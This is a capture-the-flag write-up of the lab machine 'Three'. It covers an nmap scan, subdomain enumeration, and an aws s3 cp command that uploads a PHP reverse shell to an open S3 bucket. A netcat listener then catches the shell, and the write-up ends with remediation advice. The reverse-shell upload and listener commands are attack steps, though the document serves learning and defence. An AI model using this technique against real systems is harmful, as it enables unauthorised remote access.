## General Information
- Machine: Three
- Difficulty: Very easy
- OS: Linux
- Date: 15/03/2023


## Methodology
- Reconnaissance: 
    - Identification of the target machine's IP address, open ports, and services.
    - Gathering information from the website running on port 80, including contact details and the hostname. Performing DNS enumeration to identify subdomains. Identifying IP addresses associated with the hostnames.
- Exploration:
    - Upload of a PHP reverse shell to the S3 bucket. Establishment of a reverse shell connection with the target machine.
- Results Analysis:
    - Documentation of findings, identification of vulnerabilities, and recommendations for remediation.


## Results
During the reconnaissance phase, the IP address, open ports, and services of the target machine were identified. The website on port 80 provided contact information and revealed the hostname s3.thetoppers.htb. Further enumeration led to the discovery of the S3 bucket named thetoppers.htb, containing index.php and .ht files.  

In the exploration phase, a PHP reverse shell was uploaded to the S3 bucket, allowing a successful reverse shell connection to the target machine. Through this connection, further exploration was conducted, leading to the discovery of the flag at /var/www/flag.txt.

### Reconnaissance
- IP: 10.129.29.185
- Port Scan results:

| Port   | State | Service | Version         |
|--------|-------|---------|-----------------|   
| 22/tcp | open  | ssh     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) |
| 80/tcp | open  | http    | Apache httpd 2.4.29 ((Ubuntu)) |

### Commands and analyzes used

#### Nmap
~~~nmap
sudo nmap -sVC -p- -T4 -Pn --open -O 10.129.29.185 -oA ./service_scan_port
~~~

#### Enumeration of web page content.
~~~Enumeration
http://10.129.29.185/

- CONTACT:
    Chicago, US
    Phone: +01 343 123 6102
    Email: mail@thetoppers.htb
~~~

#### hostnames to IP addresses
~~~hostnames to IP addresses
/etc/host
    10.129.29.185 thetoppers.htb s3.thetoppers.htb
~~~

#### gobuster
~~~ gobuster
gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
~~~

#### AWS(CLI)
~~~ AWS
aws s3 --endpoint-url=http://s3.thetoppers.htb --color=on  cp php-reverse-shell.php s3://thetoppers.htb   
~~~

#### Netcat
~~~ Netcat
sudo nc -lvnp 443  
~~~


## Recommendations
- Enhance access permissions and policies, preventing public access to sensitive files. Encrypt the stored data for additional security.
- Deploy a monitoring system to detect suspicious activity and unauthorized access attempts. Regularly review logs and set up alerts for potential security breaches.
- Implement rigorous filters and validations to block malicious file uploads. Validate content and filter file types to allow only safe and trusted files in the bucket.